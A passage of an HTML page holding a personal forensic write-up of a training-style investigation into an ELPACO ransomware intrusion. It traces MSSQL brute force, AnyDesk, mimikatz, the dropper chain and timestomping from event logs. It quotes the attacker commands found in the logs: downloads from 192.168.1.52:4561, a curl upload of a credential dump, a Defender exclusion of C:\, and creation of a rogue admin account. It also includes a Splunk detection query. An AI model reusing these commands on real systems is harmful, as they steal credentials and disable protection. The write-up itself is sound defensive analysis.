@@ -1,0 +1,657 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>ELPACO-Team Write-up | Joan Dimas</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="../assets/css/style.css">
+  <style>
+    .question-box {
+      margin: 1rem 0 1.5rem;
+      padding: 1rem 1.25rem;
+      background: rgba(var(--accent-rgb), 0.08);
+      border-left: 4px solid var(--accent);
+      border-radius: 12px;
+    }
+
+    .question-box p {
+      color: var(--text-strong);
+      margin: 0;
+    }
+
+    .answer-block {
+      padding: 0.25rem 0 0.5rem;
+    }
+
+    .task {
+      margin-bottom: 3rem;
+    }
+
+    .task h3 {
+      color: var(--accent);
+    }
+  
+
+    /* Match Fog's Hisoka theme while retaining existing page layouts. */
+    .argus-content {
+      min-width: 0;
+    }
+    .argus-content .image-block figcaption {
+      color: var(--text-muted);
+      font-size: 0.85rem;
+      line-height: 1.5;
+      margin-top: 0.75rem;
+    }
+    .argus-content ol {
+      padding-left: 1.5rem;
+      margin-bottom: 1.5rem;
+    }
+    .argus-content .answer-block p,
+    .argus-content .answer-block li {
+      overflow-wrap: anywhere;
+    }
+    .argus-content pre,
+    .argus-content pre code {
+      white-space: pre;
+    }
+    .argus-content table {
+      width: 100%;
+      border-collapse: collapse;
+      margin: 1.2rem 0 2rem;
+    }
+    .argus-content table:not(.ioc-table) th,
+    .argus-content table:not(.ioc-table) td {
+      border: 1px solid var(--border-main);
+      padding: 12px 14px;
+      text-align: left;
+      vertical-align: top;
+      overflow-wrap: anywhere;
+      color: var(--text-main);
+    }
+    .argus-content table:not(.ioc-table) th {
+      color: var(--text-strong);
+      background: rgba(var(--accent-rgb), 0.20);
+    }
+    .argus-content table:not(.ioc-table) tr:nth-child(even) {
+      background: rgba(var(--accent2-rgb), 0.10);
+    }
+    .argus-content table:not(.ioc-table) tr:nth-child(odd) {
+      background: var(--surface);
+    }
+    .argus-content table:not(.ioc-table) tr:hover {
+      background: rgba(var(--accent-rgb), 0.16);
+    }
+    .argus-content .table-wrap {
+      overflow-x: auto;
+      margin: 1.25rem 0 2rem;
+    }
+    @media (max-width: 700px) {
+      .argus-page { padding: 1.25rem 0.7rem; }
+      .argus-content { padding: 1.5rem 1rem; }
+      .argus-content table:not(.ioc-table) {
+        display: block;
+        overflow-x: auto;
+      }
+    }
+</style>
+</head>
+
+<body class="project-page">
+
+<div class="argus-page">
+
+  <!-- Header -->
+  <header class="argus-header">
+    <h1>ELPACO-Team Write-up</h1>
+    <a class="back-link" href="../index.html">← Back to HTB Writeups</a>
+  </header>
+
+  <!-- Main Content -->
+  <main class="argus-content">
+<h2>Scenario:</h2>
+<p>On December 13, 2024, the Security Operations Center (SOC) detected unusual activity from a financial workstation. Unauthorized access and suspicious modifications to security settings were observed, suggesting malicious intent.</p>
+<p>Investigate the incident to uncover how the compromise occurred, methods used to maintain access, and the scope of sensitive data affected.</p>
+
+<hr class="section-divider">
+<section class="task" id="executive-summary">
+<h3>Executive Summary</h3>
+<p>On December 13, 2024, a financial workstation (<code>ABOZ4HRA</code>) was involved in a ransomware intrusion following an MSSQL brute-force attack. Analysis identified 21 failed SQL authentication attempts from <code>10.10.10.55</code>, followed by a successful login at <code>22:52:47</code>. Subsequent activity showed the SQL Server process spawning commands to weaken Microsoft Defender protection and download attacker tools from <code>192.168.1.52:4561</code>.</p>
+<p>The attacker deployed AnyDesk, created a privileged local account named <code>Reng0ku</code>, downloaded Mimikatz, and issued an HTTP upload command targeting <code>C:\Mimikatz_dump.txt</code>. The ransomware dropper <code>oh_my_gotto.exe</code> extracted additional components and launched <code>ELPACO-team.exe</code>, which in turn launched the masquerading ransomware executable <code>svhostss.exe</code> and a GUI component, <code>gui40.exe</code>. The investigation also identified timestamp manipulation, use of <code>Everything32.dll</code>, a ransom note containing a victim decryption ID, and an SDelete-based free-space wiping command.</p>
+<p>The observed activity demonstrates credential-access attempts, persistence, defense evasion, ransomware deployment, and attempted exfiltration. The available evidence confirms ransom-note creation and execution of a command to upload credential material; it does not independently establish the full scope of encrypted files or verify that the upload completed.</p>
+</section>
+<hr class="section-divider">
+    <!-- Q1 -->
+    <section class="task" id="q1">
+      <h3>Q1:</h3>
+      <div class="question-box"><p>How many failed login attempts did the attacker make during their brute-force attack on the MSSQL server?</p></div>
+      <div class="answer-block"><p>To begin the investigation, I parsed the <strong>Master File Table (MFT), USN Journal, and Windows Event Logs</strong> using Eric Zimmerman's forensic tools to extract relevant artifacts for timeline analysis.</p>
+<p>First, I used <strong>MFTECmd</strong> to process the MFT and USN Journal:</p>
+<pre><code class="language-powershell">MFTECmd.exe -f &quot;C:\Users\Administrator\Desktop\Start Here\Artifacts\Disk Triage\C\$Extend\$J&quot; -m &quot;C:\Users\Administrator\Desktop\Start Here\Artifacts\Disk Triage\C\$MFT&quot; --csv &quot;C:\Users\Administrator\Desktop\Start Here\output&quot; --dr
+</code></pre>
+<p>Next, I used <strong>EvtxECmd</strong> to parse the Windows Event Logs:</p>
+<pre><code class="language-powershell">EvtxEcmd.exe -d &quot;C:\Users\Administrator\Desktop\Start Here\Artifacts\Disk Triage\C\Windows\system32\winevt&quot; --csv &quot;C:\Users\Administrator\Desktop\Start Here&quot;
+</code></pre>
+<p>After processing the artifacts, I loaded the resulting CSV files into <strong>Timeline Explorer</strong> to examine the recorded activity.</p>
+<p>To identify the brute-force attempts, I filtered for <strong>Event ID 18456</strong>, which indicates a failed SQL Server authentication attempt.</p>
+<p>The analysis revealed a series of repeated authentication failures beginning at:</p>
+<p><code>2024-12-13 22:52:46</code></p>
+<p>The events contained the following details:</p>
+<ul>
+<li><strong>Event ID:</strong> 18456</li>
+<li><strong>Failure Reason:</strong> <code>Password did not match that for the login provided.</code></li>
+<li>`CLIENT: 10.10.10.55</li>
+<li><strong>Activity:</strong> Multiple failed authentication attempts within approximately one millisecond.</li>
+</ul>
+<p>The high frequency of failed authentication attempts is consistent with automated password-guessing activity targeting the MSSQL server.</p>
+<!-- Original Obsidian image reference: Pasted image 20261105132342.png -->
+
+<figure class="image-block">
+  <img src="../assets/images/elpaco/1.png" alt="MSSQL authentication failures — Event ID 18456" loading="lazy">
+  <figcaption>MSSQL authentication failures — Event ID 18456</figcaption>
+</figure>
+
+<p>After filtering and counting the relevant events, I identified a total of <strong>21 failed login attempts</strong>.</p>
+</div>
+    </section>
+    <!-- Q2 -->
+    <section class="task" id="q2">
+      <h3>Q2:</h3>
+      <div class="question-box"><p>When did the attacker first successfully log in to the MSSQL server during the brute-force attack?</p></div>
+      <div class="answer-block"><p>Following the identification of the failed authentication attempts in Q1, I pivoted to <strong>Event ID 18454</strong>, which records successful SQL Server authentication events.</p>
+<p>Using <strong>Timeline Explorer</strong>, I filtered for Event ID <code>18454</code> and examined the events occurring around the initial brute-force activity identified in Q1.</p>
+<p>The analysis revealed a successful authentication event at:</p>
+<p><code>2024-12-13 22:52:47</code></p>
+<p>This occurred approximately <strong>one second after the previously identified failed authentication attempts</strong>, suggesting that the attacker successfully authenticated to the MSSQL server after attempting multiple passwords.</p>
+<!-- Original Obsidian image reference: Pasted image 20261105133646.png -->
+
+<figure class="image-block">
+  <img src="../assets/images/elpaco/2.png" alt="First successful MSSQL authentication — Event ID 18454" loading="lazy">
+  <figcaption>First successful MSSQL authentication — Event ID 18454</figcaption>
+</figure>
+
+<p>The close correlation between the failed authentication attempts and the subsequent successful login strongly suggests that the brute-force attack resulted in valid credentials being identified.</p>
+</div>
+    </section>
+    <!-- Q3 -->
+    <section class="task" id="q3">
+      <h3>Q3:</h3>
+      <div class="question-box"><p>Identifying the name and PID of the malicious process is crucial for understanding the nature of the attack. What is the main binary and process ID of the Windows executable that serves as a dropper for ransomware?</p></div>
+      <div class="answer-block"><p>Continuing the investigation, I analyzed the <strong>Sysmon logs</strong> from the compromised workstation, <code>ABOZ4HRA</code>, focusing on <strong>Sysmon Event ID 1 (Process Creation)</strong> to identify suspicious executable activity.</p>
+<p>During the analysis, I identified a particularly suspicious process execution event on:</p>
+<p><code>2024-12-13 23:47:03</code></p>
+<p>The event revealed that <code>cmd.exe</code>, spawned by the SQL Server process (<code>sqlservr.exe</code>), executed the following PowerShell command:</p>
+<pre><code class="language-powershell">&quot;C:\Windows\system32\cmd.exe&quot; /c powershell Invoke-WebRequest -Uri &quot;hxxp[://]192[.]168[.]1[.]52:4561/oh_my_gotto[.]exe&quot; -OutFile &quot;C:\Users\Administrator\AppData\Local\Temp\oh_my_gotto.exe&quot;
+</code></pre>
+<p>This command uses PowerShell's <code>Invoke-WebRequest</code> to download an executable named <code>oh_my_gotto.exe</code> from <code>hxxp[://]192[.]168[.]1[.]52:4561</code> and save it to the Administrator's temporary directory.</p>
+<p>The process relationship is particularly noteworthy because <strong>SQL Server spawned a command shell to download an executable</strong>, which is unusual for normal database operations and potentially indicates abuse of SQL Server functionality to execute operating system commands.</p>
+<!-- Original Obsidian image reference: Pasted image 20261105135128.png -->
+
+<figure class="image-block">
+  <img src="../assets/images/elpaco/3.png" alt="SQL Server process launching PowerShell download" loading="lazy">
+  <figcaption>SQL Server process launching PowerShell download</figcaption>
+</figure>
+
+<p>I continued examining subsequent process creation events and identified another suspicious event at:</p>
+<p><code>2024-12-13 23:48:42</code></p>
+<p>This event confirmed the execution of the previously downloaded binary.</p>
+<p>The Sysmon event contained the following information:</p>
+<ul>
+<li><strong>Executable:</strong> <code>oh_my_gotto.exe</code></li>
+<li><strong>Process ID (PID):</strong> <code>4224</code></li>
+<li><strong>Executable Path:</strong> <code>C:\Users\Administrator\AppData\Local\Temp\oh_my_gotto.exe</code></li>
+<li><strong>Parent Process:</strong> <code>explorer.exe</code></li>
+<li><strong>Parent PID:</strong> <code>888</code></li>
+<li><strong>Execution Account:</strong> <code>ABOZ4HRA\Administrator</code></li>
+</ul>
+<!-- Original Obsidian image reference: Pasted image 20261105135328.png -->
+
+<figure class="image-block">
+  <img src="../assets/images/elpaco/4.png" alt="Execution of oh_my_gotto.exe — Sysmon Event ID 1" loading="lazy">
+  <figcaption>Execution of oh_my_gotto.exe — Sysmon Event ID 1</figcaption>
+</figure>
+
+<p>The correlation between the initial PowerShell download and subsequent execution confirms that the executable was retrieved and launched on the compromised workstation.</p>
+<p>Additionally, the executable was launched under the Administrator account, indicating that it executed within a privileged user context.</p>
+<p>Based on these findings, <code>oh_my_gotto.exe</code> was identified as the suspected ransomware dropper.</p>
+<p><strong>Answer:</strong> <code>oh_my_gotto.exe, 4224</code></p>
+</div>
+    </section>
+    <!-- Q4 -->
+    <section class="task" id="q4">
+      <h3>Q4:</h3>
+      <div class="question-box"><p>After executing the main malicious binary as a dropper, what is the name of the directory where the initial malicious components were dropped?</p></div>
+      <div class="answer-block"><p>Building on the findings from Q3, I continued analyzing <strong>Sysmon Event ID 1 (Process Creation)</strong> to investigate the activity immediately following the execution of <code>oh_my_gotto.exe</code>.</p>
+<p>By examining the child processes spawned by the malicious executable, I identified several commands referencing the following directory:</p>
+<pre><code class="language-text">C:\Users\Administrator\AppData\Local\Temp\7ZipSfx.000\
+</code></pre>
+<p>The directory name <code>7ZipSfx.000</code> suggests that the malicious executable was packaged as a <strong>7-Zip self-extracting (SFX) archive</strong>, which extracted its embedded components into a temporary directory.</p>
+<p>Further analysis revealed several suspicious commands referencing this location, including:</p>
+<pre><code class="language-cmd">&quot;C:\Users\Administrator\AppData\Local\Temp\7ZipSfx.000\7za.exe&quot; x -y -p7183204373585782 Everything64.dll
+</code></pre>
+<p>This command uses the 7-Zip executable (<code>7za.exe</code>) to extract a password-protected archive component named <code>Everything64.dll</code>.</p>
+<p>Additional process creation events referenced other executables and scripts, suggesting that the dropper initiated a multistage execution chain after extraction.</p>
+<!-- Original Obsidian image reference: Pasted image 20261105135952.png -->
+
+<figure class="image-block">
+  <img src="../assets/images/elpaco/5.png" alt="7-Zip SFX payload extraction activity" loading="lazy">
+  <figcaption>7-Zip SFX payload extraction activity</figcaption>
+</figure>
+
+<p>These findings indicate that <code>oh_my_gotto.exe</code> acted as a self-extracting dropper, using the temporary directory to stage additional components before executing subsequent payloads.</p>
+</div>
+    </section>
+    <!-- Q5 -->
+    <section class="task" id="q5">
+      <h3>Q5:</h3>
+      <div class="question-box"><p>What are the first 10 characters of the SHA256 hash of the remote desktop software installed by the attacker on the victim's machine?</p></div>
+      <div class="answer-block"><p>Continuing the investigation, I analyzed the <strong>Sysmon Event ID 1 (Process Creation)</strong> logs to identify any remote access software installed or executed by the attacker.</p>
+<p>During the analysis, I observed suspicious activity involving <strong>AnyDesk</strong>, a legitimate remote monitoring and management (RMM) tool commonly used for remote administration but also frequently abused by threat actors to establish persistent remote access.</p>
+<p>The earliest identified AnyDesk-related activity occurred at:</p>
+<p><code>2024-12-13 23:42:08</code></p>
+<p>The associated process creation events revealed commands related to AnyDesk, suggesting that the attacker was attempting to establish remote access to the compromised workstation.</p>
+<!-- Original Obsidian image reference: Pasted image 20261105140608.png -->
+
+<figure class="image-block">
+  <img src="../assets/images/elpaco/6.png" alt="AnyDesk process creation activity" loading="lazy">
+  <figcaption>AnyDesk process creation activity</figcaption>
+</figure>
+
+<p>To investigate further, I filtered the process creation events for <code>AnyDesk.exe</code> and examined the corresponding Sysmon event details.</p>
+<p>Sysmon Event ID 1 includes executable hash information when hash collection is configured, allowing investigators to identify the exact binary executed on the system.</p>
+<p>From the recorded <code>Hashes</code> field, I extracted the SHA256 hash and identified its first 10 characters:</p>
+<pre><code>FFF4B96876
+</code></pre>
+<p>NOTE:
+If the specific RMM tool were initially unknown, another effective investigative approach would be to examine <strong>Windows Event ID 7045 (Service Installation)</strong> and <strong>Event ID 4697 (Service Installed in the System)</strong>.</p>
+<p>Many RMM tools, including AnyDesk, can install Windows services to support unattended access and background operation.</p>
+<p>Reviewing newly created services, their executable paths, and associated installation timestamps can help identify potentially unauthorized remote access software.</p>
+<p>However, service creation is not guaranteed, since some RMM tools can operate in portable mode without installing a service.</p>
+<p>Correlating service installation events with Sysmon process creation telemetry provides a stronger method for detecting unauthorized RMM deployment.</p>
+</div>
+    </section>
+    <!-- Q6 -->
+    <section class="task" id="q6">
+      <h3>Q6:</h3>
+      <div class="question-box"><p>What is the MITRE sub-technique ID associated with the method the attacker used to establish persistence?</p></div>
+      <div class="answer-block"><p>While reviewing the process creation events from the previous investigation, I identified several suspicious commands associated with <strong>local account creation and privilege escalation</strong>.</p>
+<p>Specifically, the attacker executed the following commands:</p>
+<pre><code class="language-cmd">net user Reng0ku H@cker123 /add
+net localgroup administrators Reng0ku /add
+</code></pre>
+<p>The first command creates a new local user account named <code>Reng0ku</code>, while the second adds that account to the local <strong>Administrators</strong> group, granting it administrative privileges.</p>
+<p>Interestingly, the logs also revealed the use of <code>net1.exe</code> and a command referencing <code>administradores</code>, the Spanish name for the Administrators group.</p>
+<p>These commands indicate that the attacker attempted to establish persistent access through a newly created, privileged local account.</p>
+<!-- Original Obsidian image reference: Pasted image 20261105141438.png -->
+
+<figure class="image-block">
+  <img src="../assets/images/elpaco/7.png" alt="Local account creation and administrator group modification" loading="lazy">
+  <figcaption>Local account creation and administrator group modification</figcaption>
+</figure>
+
+<p>This activity aligns with the following MITRE ATT&amp;CK sub-technique:
+<strong>T1136.001 - Create Account: Local Account</strong></p>
+<p>By creating a local account, the attacker established an additional method of accessing the compromised workstation, potentially allowing continued access even if the original entry point was remediated.</p>
+</div>
+    </section>
+    <!-- Q7 -->
+    <section class="task" id="q7">
+      <h3>Q7:</h3>
+      <div class="question-box"><p>Which path did the attacker exclude to evade defenses?</p></div>
+      <div class="answer-block"><p>Continuing the investigation, I identified suspicious activity involving modifications to Microsoft Defender Antivirus settings.</p>
+<p>The activity occurred on:</p>
+<p><code>2024-12-13 23:37:10</code></p>
+<p>The following command was executed:</p>
+<pre><code class="language-powershell">&quot;C:\Windows\system32\cmd.exe&quot; /c powershell.exe -Command &quot;Set-MpPreference -ExclusionPath 'C:\'&quot;
+</code></pre>
+<p>This command uses PowerShell's <code>Set-MpPreference</code> cmdlet to configure a Microsoft Defender Antivirus exclusion for the <strong>entire C:\ drive</strong>.</p>
+<p>By excluding the root of the C: drive, the attacker attempted to prevent Microsoft Defender Antivirus from scanning files within that location, significantly weakening the system's malware detection capabilities.</p>
+<p>Another important observation is that the command was spawned by <code>**sqlservr.exe**</code>, running under the <code>NT SERVICE\MSSQLSERVER</code> account. This further supports the possibility that the attacker abused SQL Server functionality to execute operating system commands.</p>
+<!-- Original Obsidian image reference: Pasted image 20261105142420.png -->
+
+<figure class="image-block">
+  <img src="../assets/images/elpaco/8.png" alt="Microsoft Defender exclusion modification" loading="lazy">
+  <figcaption>Microsoft Defender exclusion modification</figcaption>
+</figure>
+
+<p>This activity aligns with <strong>MITRE ATT&amp;CK T1562.001 - Impair Defenses: Disable or Modify Tools</strong>, as the attacker attempted to weaken endpoint protection by modifying antivirus exclusions.</p>
+<p>Although Splunk was not used for this particular investigation, a useful approach for detecting similar activity in a SOC environment would be to search for suspicious PowerShell commands modifying Microsoft Defender settings.</p>
+<pre><code class="language-spl">index=YourIndexHere
+(&quot;Add-MpPreference&quot; OR &quot;Set-MpPreference&quot; OR &quot;ExclusionPath&quot;)
+| table _time host EventCode Image CommandLine ScriptBlockText Message
+| sort - _time
+</code></pre>
+<p>This query searches across available indexed telemetry for references to Defender configuration commands, helping identify potential attempts to add or modify antivirus exclusions.</p>
+<p>For a more targeted investigation, these results can be correlated with process creation events, PowerShell Script Block Logging (Event ID 4104), and Microsoft Defender configuration change events (Event ID 5007).</p>
+<p><strong>Event ID 5007 is particularly valuable</strong>, as it can provide evidence that Defender settings actually changed, rather than merely showing that a command was executed.</p>
+</div>
+    </section>
+    <!-- Q8 -->
+    <section class="task" id="q8">
+      <h3>Q8:</h3>
+      <div class="question-box"><p>What is the password for the protected archive that contains the additional malicious payloads?</p></div>
+      <div class="answer-block"><p>This was seen earlier when <code>oh_my_gotto.exe</code> was ran. A few seconds later, we see:</p>
+<pre><code>&quot;C:\Users\Administrator\AppData\Local\Temp\7ZipSfx.000\7za.exe&quot; x -y -p7183204373585782 Everything64.dll
+</code></pre>
+<p><code>7183204373585782</code> being the password for the archive.</p>
+</div>
+    </section>
+    <!-- Q9 -->
+    <section class="task" id="q9">
+      <h3>Q9:</h3>
+      <div class="question-box"><p>What are the first 8 characters of the directory name created by the malware to store and copy the dropped files?</p></div>
+      <div class="answer-block"><p>Continuing the investigation, I examined the logs to trace the execution chain following the initial deployment of <code>oh_my_gotto.exe</code>.</p>
+<p>As identified previously, the initial dropper extracted components into the temporary directory <code>7ZipSfx.000</code>, from which another executable, <code>ELPACO-team.exe</code>, was launched.</p>
+<p>Further analysis revealed that <code>ELPACO-team.exe</code> subsequently spawned an executable named <code>svhostss.exe</code>, located within a separate directory:</p>
+<pre><code class="language-text">C:\Users\Administrator\AppData\Local\BD3FDDDF-6CAF-3EBC-D9CF-C8DF72D8F78A\
+</code></pre>
+<p>Additional process creation events referenced several executables within this directory, including <code>gui40.exe</code>, <code>Everything.exe</code>, and <code>DC.exe</code>.</p>
+<p>This suggests that the malware used the directory as a secondary staging location for its additional components.</p>
+<!-- Original Obsidian image reference: Pasted image 20261105143022.png -->
+
+<figure class="image-block">
+  <img src="../assets/images/elpaco/9.png" alt="Secondary malware staging directory" loading="lazy">
+  <figcaption>Secondary malware staging directory</figcaption>
+</figure>
+
+<p>The execution sequence indicates that the initial dropper launched a secondary executable, which then initiated additional processes from the newly identified directory.</p>
+<p><strong>Answer:</strong> <code>BD3FDDDF</code></p>
+</div>
+    </section>
+    <!-- Q10 -->
+    <section class="task" id="q10">
+      <h3>Q10:</h3>
+      <div class="question-box"><p>The attacker attempted to disguise the ransomware by renaming it to resemble a legitimate system process. What new name was assigned to the ransomware?</p></div>
+      <div class="answer-block"><p>Continuing the investigation, I correlated <strong>Sysmon Event ID 1 (Process Creation)</strong> with the <strong>USN Journal</strong> to examine the ransomware's execution and associated file system activity.</p>
+<p>At <code>2024-12-13 23:48:49</code>, Sysmon recorded the execution of a suspicious executable named <code>svhostss.exe</code>, launched by the previously identified <code>ELPACO-team.exe</code>.</p>
+<p>The relevant event details were:</p>
+<pre><code class="language-text">Timestamp:      2024-12-13 23:48:49.611
+Event ID:       1 (Process Creation)
+Image:          C:\Users\Administrator\AppData\Local\BD3FDDDF-6CAF-3EBC-D9CF-C8DF72D8F78A\svhostss.exe
+Process ID:     1220
+Parent Image:   C:\Users\Administrator\AppData\Local\Temp\7ZipSfx.000\ELPACO-team.exe
+Parent PID:     4772
+User:           ABOZ4HRA\Administrator
+</code></pre>
+<p>The filename <code>svhostss.exe</code> closely resembles the legitimate Windows process <code>svchost.exe</code> (Service Host), suggesting an attempt to disguise malicious activity through <strong>masquerading</strong>.</p>
+<p>To further investigate, I examined the parsed USN Journal and identified multiple file system records referencing <code>svhostss.exe</code> at approximately <code>23:48:49</code>, correlating with its execution timestamp.</p>
+<!-- Original Obsidian image reference: Pasted image 20261105143619.png -->
+
+<figure class="image-block">
+  <img src="../assets/images/elpaco/10.png" alt="svhostss.exe execution and USN Journal activity" loading="lazy">
+  <figcaption>svhostss.exe execution and USN Journal activity</figcaption>
+</figure>
+
+<p>The correlation between the process creation event and USN Journal activity supports the finding that the suspicious executable was present and active during the malware deployment sequence.</p>
+</div>
+    </section>
+    <!-- Q11 -->
+    <section class="task" id="q11">
+      <h3>Q11:</h3>
+      <div class="question-box"><p>To further evade detection, the attacker manipulated the file's timestamp. What is the stomped UTC creation timestamp of the ransomware file?</p></div>
+      <div class="answer-block"><p>Continuing the investigation, I examined the <strong>Master File Table (MFT)</strong> to identify potential timestamp manipulation associated with the ransomware executable <code>svhostss.exe</code>.</p>
+<p>As established in the previous questions, the ransomware executable appeared on the compromised workstation on <strong>December 13, 2024</strong>, with Sysmon recording its execution at <code>23:48:49</code>.</p>
+<p>However, after filtering the parsed MFT records for <code>svhostss.exe</code> in <strong>Timeline Explorer</strong>, I identified a significantly older creation timestamp:</p>
+<p><code>2021-08-19 01:32:31 UTC</code></p>
+<p>This timestamp is inconsistent with the previously observed malware deployment activity in December 2024, suggesting that the attacker manipulated the file's creation timestamp to make the executable appear older than it actually was.</p>
+<p>This technique is known as <strong>timestomping</strong>, in which attackers modify file timestamps to obscure malicious activity and complicate forensic timeline analysis.</p>
+<!-- Original Obsidian image reference: Pasted image 20261105144212.png -->
+
+<figure class="image-block">
+  <img src="../assets/images/elpaco/11.png" alt="MFT timestamps associated with svhostss.exe" loading="lazy">
+  <figcaption>MFT timestamps associated with svhostss.exe</figcaption>
+</figure>
+
+</div>
+    </section>
+    <!-- Q12 -->
+    <section class="task" id="q12">
+      <h3>Q12:</h3>
+      <div class="question-box"><p>The ransomware executed a malicious file that is responsible for disabling Windows Defender. What is the name of the malicious file?</p></div>
+      <div class="answer-block"><p>At approximately <code>2024-12-13 23:51:45</code>, I identified the following suspicious command:</p>
+<pre><code class="language-cmd">&quot;C:\ProgramData\Microsoft\Windows Defender\platform\4.18.24090.11-0\MpCmdRun.exe&quot; -DisableService
+</code></pre>
+<p>This command attempts to disable the Microsoft Defender service using <code>MpCmdRun.exe</code>, a legitimate Microsoft Defender command-line utility.</p>
+<p>Correlating this activity with preceding process creation events revealed execution of <code>**DC.exe**</code>, an executable previously observed within the ransomware's staging directory:</p>
+<pre><code class="language-text">C:\Users\Administrator\AppData\Local\BD3FDDDF-6CAF-3EBC-D9CF-C8DF72D8F78A\DC.exe
+</code></pre>
+<p>The close relationship between <code>DC.exe</code> and the subsequent Defender-disabling activity suggests that this executable was responsible for attempting to interfere with endpoint protection.</p>
+</div>
+    </section>
+    <!-- Q13 -->
+    <section class="task" id="q13">
+      <h3>Q13:</h3>
+      <div class="question-box"><p>What are the IP address and port of the C2 server the attacker used to transfer their malicious tools?</p></div>
+      <div class="answer-block"><p>During the investigation, I previously identified a PowerShell command responsible for downloading the ransomware dropper, <code>oh_my_gotto.exe</code>.</p>
+<p>Further analysis revealed another suspicious PowerShell command executed at approximately:</p>
+<p><code>2024-12-13 23:45:29</code></p>
+<pre><code class="language-powershell">powershell -Command &quot;Invoke-WebRequest -Uri http://192.168.1.52:4561/mimikatz.exe -OutFile \&quot;C:\Program Files (x86)\mimikatz.exe\&quot;&quot;
+</code></pre>
+<p>This command uses PowerShell's <code>Invoke-WebRequest</code> to download <code>mimikatz.exe</code>, a credential-dumping tool commonly abused by attackers to extract authentication credentials from compromised Windows systems.</p>
+<p>The command revealed the following information:</p>
+<ul>
+<li><strong>Remote IP Address:</strong> <code>192[.]168[.]1[.]52</code></li>
+<li><strong>Destination Port:</strong> <code>4561</code></li>
+<li><strong>Downloaded File:</strong> <code>mimikatz.exe</code></li>
+<li><strong>Download Location:</strong> <code>C:\Program Files (x86)\mimikatz.exe</code></li>
+</ul>
+<p>The same IP address and port were also observed in the earlier command used to download <code>oh_my_gotto.exe</code>, establishing a connection between the infrastructure used to deliver multiple malicious tools.</p>
+<!-- Original Obsidian image reference: Pasted image 20261105151407.png -->
+
+<figure class="image-block">
+  <img src="../assets/images/elpaco/12.png" alt="Malicious tool download from 192.168.1.52:4561" loading="lazy">
+  <figcaption>Malicious tool download from 192.168.1.52:4561</figcaption>
+</figure>
+
+<p>These findings identify <code>192[.]168[.]1[.]52:4561</code> as the attacker-controlled endpoint used to distribute malicious tools to the compromised workstation.</p>
+</div>
+    </section>
+    <!-- Q14 -->
+    <section class="task" id="q14">
+      <h3>Q14:</h3>
+      <div class="question-box"><p>The GUI interface is used to control the operation of the ransomware. What is the name of the process and PID?</p></div>
+      <div class="answer-block"><p>As was observed in previous questions, an executable named <code>gui40.exe</code> was deployed alongside other malicious components within the ransomware's staging directory.</p>
+<p>By filtering the process creation events for <code>gui40.exe</code>, I identified the following execution event:</p>
+<pre><code class="language-text">Timestamp:         2024-12-13 23:48:53.247 UTC
+Event ID:          1 (Process Creation)
+Process Name:      gui40.exe
+Process ID:        5484
+OriginalFileName:  unwrapper.exe
+Description:       GUI
+Parent Process:    svhostss.exe
+Parent PID:        1220
+User:              ABOZ4HRA\Administrator
+Integrity Level:   High
+</code></pre>
+<p>The event confirmed that <code>gui40.exe</code> was launched by <code>svhostss.exe</code>, the previously identified ransomware executable.</p>
+<p>Additionally, the executable metadata contained the description <code>GUI</code> and the original filename <code>unwrapper.exe</code>, further supporting its identification as the ransomware's graphical interface component.</p>
+<!-- Original Obsidian image reference: Pasted image 20261105151852.png -->
+
+<figure class="image-block">
+  <img src="../assets/images/elpaco/13.png" alt="gui40.exe process creation event" loading="lazy">
+  <figcaption>gui40.exe process creation event</figcaption>
+</figure>
+
+<p>The parent-child relationship establishes the following execution sequence:</p>
+<p><code>ELPACO-team.exe</code> → <code>svhostss.exe</code> → <code>gui40.exe</code></p>
+<p>This indicates that the ransomware launched a separate GUI component as part of its execution chain, likely providing an interface for controlling or monitoring its operations.</p>
+<p><strong>Answer:</strong> <code>gui40.exe, 5484</code></p>
+</div>
+    </section>
+    <!-- Q15 -->
+    <section class="task" id="q15">
+      <h3>Q15:</h3>
+      <div class="question-box"><p>After dumping the credentials, the attacker transferred the output file to their C2 server. What is the name of the exfiltrated file?</p></div>
+      <div class="answer-block"><p>As previously identified, the attacker downloaded <code>mimikatz.exe</code> onto the compromised workstation, suggesting an attempt to extract credentials from the system.</p>
+<p>Further analysis revealed suspicious activity at:</p>
+<p><code>2024-12-13 23:46:36</code></p>
+<p>The following command was executed:</p>
+<pre><code class="language-cmd">&quot;C:\Windows\system32\cmd.exe&quot; /c curl -T C:\Mimikatz_dump.txt http://192.168.1.52:4561
+</code></pre>
+<p>This command uses <code>curl</code> with the <code>**-T**</code> <strong>(upload file)</strong> parameter to transfer <code>Mimikatz_dump.txt</code> to the attacker's server at <code>192.168.1.52:4561</code>.</p>
+<p>The command reveals the following information:</p>
+<ul>
+<li><strong>Source File:</strong> <code>C:\Mimikatz_dump.txt</code></li>
+<li><strong>Destination:</strong> <code>http://192.168.1.52:4561</code></li>
+<li><strong>Transfer Method:</strong> HTTP upload using <code>curl -T</code></li>
+</ul>
+<!-- Original Obsidian image reference: Pasted image 20261105152611.png -->
+
+<figure class="image-block">
+  <img src="../assets/images/elpaco/14.png" alt="HTTP transfer of Mimikatz_dump.txt" loading="lazy">
+  <figcaption>HTTP transfer of Mimikatz_dump.txt</figcaption>
+</figure>
+
+<p>This activity strongly indicates an attempt to exfiltrate credentials collected from the compromised workstation.</p>
+</div>
+    </section>
+    <!-- Q16 -->
+    <section class="task" id="q16">
+      <h3>Q16:</h3>
+      <div class="question-box"><p>After launching the ransomware, it used a legitimate DLL component to select target files for encryption. What is the name of the DLL?</p></div>
+      <div class="answer-block"><p>Initially, I suspected the answer was <code>Everything64.dll</code>, as we previously identified the following command during the ransomware's execution:</p>
+<pre><code class="language-cmd">&quot;C:\Users\Administrator\AppData\Local\Temp\7ZipSfx.000\7za.exe&quot; x -y -p7183204373585782 Everything64.dll
+</code></pre>
+<p>However, this was not the correct answer.</p>
+<p>To investigate further, I conducted additional research into the <strong>ELPACO ransomware family</strong>, which led me to information about its use of the legitimate <strong>Everything file-search utility</strong>.</p>
+<p>The research indicated that ELPACO abuses <code>Everything32.dll</code> to enumerate and identify files targeted for encryption, utilizing the DLL's <code>SetSearchW</code> functionality.</p>
+<!-- Original Obsidian image reference: Pasted image 20261105153739.png -->
+
+<figure class="image-block">
+  <img src="../assets/images/elpaco/15.png" alt="Everything file-search utility research" loading="lazy">
+  <figcaption>Everything file-search utility research</figcaption>
+</figure>
+.
+
+<p>With this information, I returned to <strong>Timeline Explorer</strong> and filtered the Sysmon logs for <strong>Event ID 11 (File Create)</strong>, searching specifically for <code>Everything32.dll</code>.</p>
